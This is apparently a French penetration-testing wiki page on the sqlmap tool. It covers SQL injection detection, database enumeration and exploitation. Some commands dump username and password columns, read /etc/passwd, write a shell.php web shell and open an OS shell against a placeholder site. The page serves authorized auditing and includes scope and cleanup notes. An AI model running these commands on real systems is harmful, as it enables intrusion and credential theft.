---
title: Outil - sqlmap
tags:
  - offensif/audit-web-api
  - pentest
  - outil
  - web
  - sqli
---

# Outil - sqlmap

> **Note.** Présentation
> sqlmap est l'outil de référence pour la détection et l'exploitation automatisée d'injections SQL, couvrant la plupart des SGBD (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.).

## Détection

```bash
# Cible simple via paramètre GET
sqlmap -u "https://exemple.tld/produit?id=1" --batch

# À partir d'une requête capturée dans Burp (recommandé : gère cookies, en-têtes, corps)
sqlmap -r requete.txt --batch --level=3 --risk=2
```

| Option | Rôle |
|---|---|
| `--batch` | Répond automatiquement aux invites interactives avec les valeurs par défaut |
| `--level` (1-5) | Étendue des points d'injection testés (en-têtes, cookies inclus à partir du niveau 2) |
| `--risk` (1-3) | Agressivité des payloads (niveau 3 inclut des requêtes potentiellement destructives) |
| `--dbms` | Force le SGBD ciblé, accélère et fiabilise la détection |
| `-p` | Restreint le test à un paramètre précis |
| `--technique` | Restreint aux techniques choisies (B: boolean, T: time, U: union, E: error, S: stacked) |

## Énumération

```bash
sqlmap -u "https://exemple.tld/produit?id=1" --batch --dbs
sqlmap -u "https://exemple.tld/produit?id=1" --batch -D exemple_db --tables
sqlmap -u "https://exemple.tld/produit?id=1" --batch -D exemple_db -T users --columns
sqlmap -u "https://exemple.tld/produit?id=1" --batch -D exemple_db -T users -C username,password --dump
```

## Authentification et sessions

```bash
# Réutiliser un cookie de session pour tester une zone authentifiée
sqlmap -u "https://exemple.tld/compte?id=1" --batch --cookie="PHPSESSID=abcd1234"

# Rejouer une authentification par formulaire avant chaque requête
sqlmap -u "https://exemple.tld/compte?id=1" --batch \
  --auth-type=basic --auth-cred="user:pass"
```

## Exploitation avancée

```bash
# Lecture de fichier serveur
sqlmap -u "https://exemple.tld/produit?id=1" --batch --file-read="/etc/passwd"

# Écriture de fichier (nécessite privilèges FILE et chemin accessible en écriture)
sqlmap -u "https://exemple.tld/produit?id=1" --batch --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Shell interactif SQL puis shell système (si privilèges suffisants)
sqlmap -u "https://exemple.tld/produit?id=1" --batch --sql-shell
sqlmap -u "https://exemple.tld/produit?id=1" --batch --os-shell
```

> **Note.** Impact sur la cible
> Un `--risk=3` ou un `--os-shell` peut altérer des données ou déposer un fichier sur le serveur. En audit, documenter précisément toute action d'écriture réalisée et la nettoyer (suppression du fichier déposé) en fin de mission.

> **Note.** Cadre d'usage
> Les options `--os-shell`/`--file-write` déposent du code exécutable sur le
> serveur cible : réservé au périmètre couvert par le mandat — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [Injection-SQL](../02-Vulnerabilites-web-classiques/Injection-SQL.md)
- [Audit-Web-et-API-MOC](../Audit-Web-et-API-MOC.md)
